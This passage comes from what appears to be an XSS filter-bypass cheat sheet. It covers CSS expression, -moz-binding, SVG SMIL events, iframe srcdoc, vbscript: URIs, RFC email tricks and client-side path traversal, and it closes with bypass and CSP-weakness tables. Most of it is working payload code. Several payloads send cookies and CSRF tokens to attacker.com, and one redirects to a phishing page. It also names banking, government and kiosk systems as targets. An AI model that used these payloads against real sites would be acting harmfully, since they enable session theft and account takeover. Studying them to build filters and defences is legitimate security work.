<div style="x:expres/**/sion(alert(1))">
<div style="x:exp\65ression(alert(1))">      <!-- \65 = e in CSS escaping -->
<div style="xss:&#101;xpression(alert(1))">  <!-- HTML entity for 'e' -->

<!-- Firefox -moz-binding (Firefox < 3, still in some legacy deployments) -->
<!-- Step 1: Host XBL file at attacker.com/xss.xml: -->
<!--   <?xml version="1.0"?>                                          -->
<!--   <bindings xmlns="http://www.mozilla.org/xbl"                  -->
<!--     xmlns:html="http://www.w3.org/1999/xhtml">                  -->
<!--     <binding id="xss">                                           -->
<!--       <implementation><constructor>alert(1)</constructor></implementation> -->
<!--     </binding>                                                   -->
<!--   </bindings>                                                    -->
<!-- Step 2: Inject via style: -->
<div style="-moz-binding:url(https://attacker.com/xss.xml#xss)">moz</div>

<!-- Modern -moz-binding variant (data: URI, no hosting needed) -->
<div style="-moz-binding:url(data:text/xml;charset=utf-8,%3C%3Fxml...)">

<!-- CSS import with expression (in @import context) -->
<style>@import 'javascript:alert(1)'</style>   <!-- Some old browsers evaluate this -->

<!-- Via link element if style-src is missing from CSP -->
<link rel="stylesheet" href="https://attacker.com/evil.css">
<!-- evil.css contains: body { xss: expression(fetch('//attacker.com/?c='+document.cookie)) } -->
```

**Where to test:**
```
- Enterprise intranets, banking portals, legacy government sites (IE11 still in use)
- Any endpoint that echoes content into <style> blocks or style= attributes
- WAF/sanitizer bypasses when style injection is allowed
- Scope: "internal tools", "legacy portal", "enterprise app" → high IE probability
```

**Source:** https://owasp.org/www-community/attacks/xss/; https://developer.mozilla.org/en-US/docs/Web/CSS/-moz-binding

---

## Client-Side Path Traversal → XSS

**Type:** DOM / reflected
**Filter bypassed:** Server-side path validation (never sees the traversal — it happens client-side in JS routing); WAF rules focused on query parameters, missing path-based traversal patterns
**Bypass logic:** In SPAs with client-side routing, JavaScript reads `location.pathname` and routes to components or fetches resources based on it. When a path segment from the URL is used in a `fetch()`, `import()`, or `<script src>` construction without sanitization, path traversal sequences (`../`, `%2F`) can redirect the fetch to a different endpoint. Unlike server-side path traversal, the server returns 200 for the SPA's index.html on all routes — but the client-side fetch target is controlled by the attacker. This technique was documented by PortSwigger in 2023 and leads to content spoofing, CSRF, or stored XSS via API response injection.
**Attack chain:** Craft URL with `/../` traversal in path → SPA router processes pathname → JS constructs `fetch('/api/' + pathname)` → traversal reaches unexpected endpoint → response injected into DOM → XSS

**Payload:**
```javascript
// Vulnerable SPA routing pattern:
// App: fetch('/api/users/' + location.pathname.split('/')[2])
// Normal URL: /app/profile → fetches /api/users/profile
// Attack URL: /app/../../admin/config → fetches /api/users/../../admin/config → /admin/config

// Step 1: Find where SPA reads location.pathname and uses it in a fetch/src
// DevTools → Sources → Search for: location.pathname, window.location.path, router.params

// Step 2: Test path traversal
// Normal: https://target.com/app/users/alice
// Traversal: https://target.com/app/users/%2F..%2F..%2Fadmin

// Step 3: If fetch response lands in innerHTML or eval → XSS
// Attack URL that injects into template:
https://target.com/app/..%2F..%2Fattacker-controlled-endpoint

// If app does: element.innerHTML = await fetch('/data/' + routeParam).then(r=>r.text())
// And attacker controls a same-origin endpoint response (e.g., error messages, search results)
// → response contains XSS payload → innerHTML sink → fires

// Encoded variants (bypass naive path filters):
/../         // standard
/..%2F       // URL-encoded slash
/..%252F     // double-encoded
/%2e%2e/     // encoded dots
/%2e%2e%2f   // combined

// Real-world chain (CSRF → Stored XSS):
// 1. Find CSRF endpoint via path traversal: /app/../../api/admin/users
// 2. POST malicious data to admin endpoint
// 3. Admin panel renders stored XSS payload
```

**Detection steps:**
```
1. Map all SPA route parameters that appear in fetch() URLs (grep for location.pathname, $route.params, useParams())
2. Replace route param with ../../ sequences
3. Check Network tab: does the fetch target change?
4. If response is inserted into DOM → check for XSS
5. Also test: React Router, Vue Router, Angular Router wildcard routes
```

**Source:** https://portswigger.net/research/client-side-path-traversal ; https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

---

## SVG SMIL Animation Event Handlers

**Type:** stored / reflected
**Filter bypassed:** WAF rules and sanitizers that block `on*=` event handlers on standard HTML elements but do not strip SMIL-specific animation events; `<animate>` / `<animateTransform>` tags absent from many sanitizer blocklists
**Bypass logic:** SVG supports Synchronized Multimedia Integration Language (SMIL) animations via `<animate>`, `<animateTransform>`, `<animateMotion>`, and `<set>` elements. These elements have their own event handlers (`onbegin`, `onend`, `onrepeat`, `onload`) that fire automatically when the SVG animation starts — requiring **zero user interaction**. Most WAF event-handler blocklists focus on `onclick`, `onload` on HTML elements, `onerror`, etc., and do not include SMIL-specific events. DOMPurify explicitly blocklists these but many commercial WAFs do not.
**Attack chain:** Stored SVG upload or inline SVG injection → SMIL animation begins automatically on render → `onbegin` fires → JS executes → cookie exfil → ATO

**Payload:**
```html
<!-- Fires immediately when SVG renders (zero interaction) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(document.cookie)" attributeName="x" dur="1s"/>
</svg>

<!-- animateTransform variant -->
<svg>
  <animateTransform onbegin="alert(1)" attributeName="transform" dur="1s"/>
</svg>

<!-- set element variant -->
<svg>
  <set onbegin="alert(document.domain)" attributeName="x" to="1"/>
</svg>

<!-- animateMotion variant -->
<svg>
  <animateMotion onbegin="alert(1)" dur="0.1s"/>
</svg>

<!-- onend fires after animation completes -->
<svg>
  <animate onend="alert(1)" attributeName="x" from="0" to="1" dur="0.01s"/>
</svg>

<!-- With exfil payload (no alerts in real PoCs) -->
<svg>
  <animate onbegin="fetch('https://attacker.com/x?c='+btoa(document.cookie))"
           attributeName="x" dur="0.01s"/>
</svg>

<!-- Minimal inline form (bypasses length limits) -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Bypass note:** DOMPurify strips these by default. Effective against: custom sanitizers, commercial WAFs (Akamai/Cloudflare rules tuned for HTML events), server-side allow-list filters that permit `<svg>` but not the full event vocabulary.

**Source:** https://www.w3.org/TR/SMIL3/ ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Hidden Input AccessKey XSS

**Type:** reflected / stored
**Filter bypassed:** WAF rules requiring user-interaction-visible elements; sanitizers that allow `<input type="hidden">` tags (since hidden inputs appear harmless); automated scanners that don't simulate keyboard shortcuts
**Bypass logic:** The HTML `accesskey` attribute allows a keyboard shortcut to "activate" any element. For hidden inputs, activation triggers `onclick`. The shortcut `Alt+SHIFT+[key]` (Firefox/Linux), `Alt+[key]` (IE/Edge), or `Ctrl+Alt+[key]` (Mac) fires the event. In social engineering phishing contexts, an attacker can instruct the victim to press a specific key combination. More practically: some screen readers and automation frameworks trigger accesskey actions automatically, making this viable in accessibility-driven ATO attacks. WAFs allowing `type="hidden"` inputs rarely inspect the `accesskey` attribute for XSS.
**Attack chain:** Hidden input with accesskey injected → victim (or automation) presses shortcut key → onclick fires → JS executes → session theft → ATO

**Payload:**
```html
<!-- Basic: hidden input fires onclick on Ctrl+Shift+X (varies by browser/OS) -->
<input type="hidden" accesskey="X" onclick="alert(document.cookie)">

<!-- With full cookie exfil -->
<input type="hidden" accesskey="q"
  onclick="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">

<!-- Text input (still hidden visually via CSS) -->
<input type="text" accesskey="x" onclick="alert(1)"
  style="position:absolute;left:-9999px">

<!-- Works on non-input elements too -->
<a href="#" accesskey="x" onclick="alert(1)" style="display:none">x</a>

<!-- Modifier key shortcuts by browser:
     Firefox on Linux:   Alt+Shift+[key]
     IE/Edge:            Alt+[key]
     Chrome/Safari Mac:  Ctrl+Option+[key]
     Chrome Linux:       Alt+[key]                      -->

<!-- Social engineering variant (instruction-based): -->
<!-- "Press Alt+A for our site to work correctly" -->
<input type="hidden" accesskey="a"
  onclick="document.location='https://phishing.com/fake-login'">
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; https://portswigger.net/research/xss-in-hidden-input-fields

---

## iframe srcdoc XSS

**Type:** reflected / stored
**Filter bypassed:** `frame-src data:` CSP restrictions (srcdoc is treated as same-origin, not a data: URI); WAFs that block `<iframe src="javascript:...">` but permit the `srcdoc` attribute
**Bypass logic:** The `srcdoc` attribute renders HTML inline inside an iframe as if it were the iframe's document. Unlike `src="data:text/html,..."` (blocked by most CSPs' `frame-src` directives), `srcdoc` content is treated as same-origin and inherits the parent page's origin — meaning it can access `document.cookie`, `localStorage`, and parent DOM. A sanitizer that strips `javascript:` and `data:` URIs from iframe `src` but allows `srcdoc` entirely passes this vector.
**Attack chain:** `<iframe srcdoc>` injection → executes in parent-domain context → `document.cookie` / `parent.document` accessible → full session theft → ATO

**Payload:**
```html
<!-- Basic execution: srcdoc HTML renders in same-origin iframe -->
<iframe srcdoc="<script>alert(document.cookie)</script>"></iframe>

<!-- When angle brackets are HTML-entity encoded in srcdoc attribute -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

<!-- With cookie exfil (same-origin — no CORS issues) -->
<iframe srcdoc="<script>
  parent.fetch('https://attacker.com/steal?c='+
    encodeURIComponent(document.cookie))
</script>"></iframe>

<!-- Access parent DOM from srcdoc frame -->
<iframe srcdoc="<script>
  var tok = parent.document.querySelector('input[name=csrf_token]').value;
  fetch('https://attacker.com/steal?t=' + tok);
</script>"></iframe>

<!-- Bypass sandbox="allow-scripts" restriction (still same-origin): -->
<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>"></iframe>
<!-- Note: with sandbox, document.cookie is accessible but parent DOM access requires
     allow-same-origin — without it, cookie is still readable from the sandboxed context -->

<!-- Short payload for length-limited contexts -->
<iframe srcdoc="<img src=x onerror=alert(1)>">
```

**CSP note:** `Content-Security-Policy: frame-src 'self'` allows `srcdoc` frames since they inherit origin. `frame-src 'none'` blocks all frames including srcdoc.

**Source:** https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Email / Tel Input RFC Abuse XSS

**Type:** reflected / stored
**Filter bypassed:** Server-side and client-side email/phone format validators that follow RFC822/RFC3966 strictly — RFC complexity creates edge cases where XSS payloads pass validation
**Bypass logic:** RFC822 email addresses allow quoted strings and comments in complex formats. Parsers implementing full RFC822 (rather than a simple regex) may accept `"><svg/onload=confirm(1)>"@x.y` as a technically valid quoted local-part. Similarly, RFC3966 `tel:` URIs allow a `phone-context` parameter that accepts arbitrary strings — enabling injection of HTML/JS after the phone number in contexts that render tel: links. Both bypass `input type=email` / `input type=tel` HTML5 validation since browser validators use simplified forms of these RFCs.
**Attack chain:** RFC-valid payload in email/tel field → passes validation → stored/reflected in HTML context → XSS fires → ATO

**Payload:**
```html
<!-- Email context: quoted local-part RFC822 injection -->
"><svg/onload=confirm(1)>"@x.y

<!-- With exfil -->
"><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"@x.y

<!-- Variation: comment in email (RFC822 allows comments in parentheses) -->
user(comment<script>alert(1)</script>)@example.com

<!-- Tel RFC3966 phone-context injection -->
+330011223344;phone-context=<script>alert(1)</script>

<!-- Tel URI with descriptive text containing XSS -->
tel:+1234567890;name="><svg/onload=alert(1)>

<!-- In mailto: href context -->
<a href="mailto:"><svg/onload=alert(1)>"@x.y">click</a>

<!-- Testing steps:
     1. Find email input fields that reflect value in HTML (confirmation page, profile)
     2. Submit RFC-complex addresses
     3. Check if output is reflected unescaped (e.g., "Welcome, <email>!")
     4. Chain: profile email displayed in admin → stored XSS in admin panel -->
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; RFC822 §6.1, RFC3966 §5

---

## SVG xlink:href / href Injection

**Type:** stored / reflected
**Filter bypassed:** WAF rules blocking `javascript:` in `href`/`src` that miss SVG-specific `xlink:href` attribute; sanitizers that allowlist SVG elements without blocking their namespace attributes
**Bypass logic:** SVG elements support the XLink namespace attribute `xlink:href` (and the newer plain `href`) for referencing external or internal resources. On `<a>`, `<use>`, and `<image>` elements this acts like `href` in HTML — including support for `javascript:` URIs. Since `xlink:href` is a qualified attribute name (namespace prefix + local name), WAF string-matching on `href=` may not catch `xlink:href=`. Additionally, `<use href="data:image/svg+xml,...#xss">` can load and instantiate an SVG from a data URI, executing scripts embedded in the referenced element.
**Attack chain:** SVG injection with xlink:href pointing to `javascript:` or malicious SVG data URI → click or load event → arbitrary JS → cookie theft → ATO

**Payload:**
```html
<!-- SVG anchor with xlink:href = javascript: URI -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert(document.cookie)">
    <text x="20" y="20">click me</text>
  </a>
</svg>

<!-- Short form using newer href (no namespace needed in HTML5 SVG) -->
<svg><a href="javascript:alert(1)"><text>click</text></a></svg>

<!-- SVG use element referencing data URI with embedded script -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4jeHNz"/>
</svg>
<!-- base64 = <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>#xss -->

<!-- SVG image element loading external SVG (same-origin SSRF / XSS chain) -->
<svg>
  <image xlink:href="https://target.com/upload/attacker.svg"/>
</svg>

<!-- Filter bypass: attribute name variations -->
xlink:href="javascript:alert(1)"
XLINK:HREF="javascript:alert(1)"
xmlns:xlink in SVG root, xlink:href on child

<!-- Practical attack flow:
     1. Find SVG upload / SVG inline injection point
     2. Inject xlink:href="javascript:alert(1)" on <a> or <use>
     3. If user clicks (social engineering) or onload fires → XSS
     4. Combined with SMIL onbegin → no user interaction needed -->
```

**Source:** https://www.w3.org/TR/SVG11/linking.html#XLinkHrefAttribute ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## VBScript Protocol XSS (IE / Legacy Browser)

**Type:** reflected / stored / DOM
**Filter bypassed:** Filters blocking `javascript:` URI scheme while not blocking `vbscript:` — completely absent from most modern WAF rulesets because mainstream browsers dropped VBScript support in the 2000s
**Bypass logic:** Internet Explorer supported `vbscript:` as a URI scheme that executes VBScript — Microsoft's alternative to JavaScript. IE 11 (still used in enterprise environments, embedded kiosks, and some legacy government systems) supports both. A `vbscript:` URI in `href`, `src`, or `action` attributes triggers VBScript execution. Since WAF rules focus on `javascript:`, `vbscript:` often passes completely unfiltered. The payload must be VBScript syntax rather than JS, but basic XSS PoCs (`msgbox`, `document.cookie` access) are straightforward.
**Attack chain:** href/src injection with vbscript: URI → bypasses javascript:-focused filter → IE executes VBScript → window.location / document.cookie access → session theft

**Payload:**
```html
<!-- Basic execution: msgbox = VBScript alert() -->
<a href="vbscript:msgbox('XSS')">click me</a>

<!-- Access document.cookie in VBScript -->
<a href="vbscript:msgbox(document.cookie)">steal cookies</a>

<!-- Navigate to attacker site with cookies in URL -->
<a href="vbscript:document.location='https://attacker.com/?c='+document.cookie">go</a>

<!-- img onerror variant -->
<img src=x onerror="document.location='vbscript:msgbox(1)'">

<!-- In iframe src -->
<iframe src="vbscript:document.write('<script>alert(1)</'+'script>')"></iframe>

<!-- Encoded variants -->
<a href="vbscript&#58;msgbox(1)">click</a>     <!-- HTML entity for : -->
<a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58;msgbox(1)">click</a>  <!-- full encoding -->

<!-- Combined IE-only: VBScript exfil via XmlHttp -->
<a href="vbscript:
  Set x = CreateObject('MSXML2.XMLHTTP')
  x.open 'GET','https://attacker.com/?c='+document.cookie,False
  x.send
">exfil</a>

<!-- Where to test:
     - Enterprise intranets (SharePoint, Oracle E-Business, SAP Fiori on IE11)
     - Kiosk systems, ATM interfaces
     - Legacy banking portals
     - Any scope mentioning "IE11 compatible" or "Windows 7" -->
```

**Source:** https://learn.microsoft.com/en-us/previous-versions/ms533050(v=vs.85) ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Bypass Matrix (Updated 2026-06-01)

### New Entries — Techniques Added 2026-06-01

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `require-trusted-types-for 'script'` | Permissive policy passthrough | `trustedTypes.getPolicy('escape').createHTML('<img src=x onerror=alert(1)>')` |
| Trusted Types + prototype pollution | Overwrite `toString` on TrustedHTML prototype | `Object.prototype.toString = function(){return '[object TrustedHTML]'}` |
| Sanitizer checks `document.body.innerHTML` only | Shadow DOM open-mode injection | `host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'` |
| `style=` / `<style>` allowed, JS blocked | CSS `expression()` (IE6-9) | `<div style="xss:expression(alert(1))">` |
| `style=` allowed (Firefox legacy) | `-moz-binding` remote XBL execution | `<div style="-moz-binding:url(https://attacker.com/xss.xml#xss)">` |
| Server validates path, SPA uses pathname in fetch | Client-side path traversal | `/app/../../admin` → SPA fetches `/admin` → response injected into DOM |
| WAF blocks HTML element `on*=` events | SVG SMIL `onbegin` / `onend` | `<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/>` |
| WAF allows `<input type="hidden">` | AccessKey keyboard shortcut XSS | `<input type="hidden" accesskey="X" onclick="alert(1)">` |
| `frame-src data:` blocked | `srcdoc` same-origin iframe | `<iframe srcdoc="<script>alert(document.cookie)</script>">` |
| Email/tel input validation | RFC822/3966 complex local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
| `href=` pattern match (misses `xlink:href`) | SVG xlink:href javascript: URI | `<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>` |
| `javascript:` scheme blocked | `vbscript:` scheme (IE11 / legacy) | `<a href="vbscript:msgbox(document.cookie)">` |

### New Sinks Documented 2026-06-01

| Sink | Context | Notes |
|------|---------|-------|
| Shadow DOM `.innerHTML` (via `shadowRoot`) | DOM / Web Components | Open mode shadow roots accessible from parent JS; sanitizer misses content |
| CSS `expression()` property value | IE6-9 style attribute | Re-evaluates on repaint; any style attribute that includes user input |
| `-moz-binding` CSS property | Firefox < 3 / legacy | Loads remote XBL file; executes JS in `<constructor>` element |
| `<animate onbegin>` / `<animateTransform onbegin>` | SVG SMIL | Fires on animation start; zero user interaction; often missed by WAFs |
| `<iframe srcdoc>` | All modern browsers | Same-origin iframe renders HTML inline; inherits parent cookies/DOM |
| `<a xlink:href="javascript:">` | SVG namespace | `xlink:href` not matched by `href=` WAF rules |
| `trustedTypes.createPolicy('default',...)` passthrough | Trusted Types | Default policy called for all bare strings; if permissive → TT fully bypassed |

### CSP Configurations — New Weaknesses (2026-06-01)

| CSP Configuration | Weakness | Bypass |
|------------------|----------|--------|
| `require-trusted-types-for 'script'` + permissive policy | Policy performs no sanitization | Inject payload into `createHTML(s => s)` passthrough policy |
| `require-trusted-types-for 'script'` + prototype pollution | PP overwrites TT type-check | Pollute `Object.prototype.toString` → arbitrary strings accepted as TrustedHTML |
| `frame-src 'self'` (missing `'none'`) | `srcdoc` not blocked by frame-src | `<iframe srcdoc>` creates same-origin iframe with full DOM/cookie access |
| No `style-src` directive | CSS `expression()` / `-moz-binding` executes | `style="xss:expression(alert(1))"` fires on IE; `-moz-binding` on legacy Firefox |

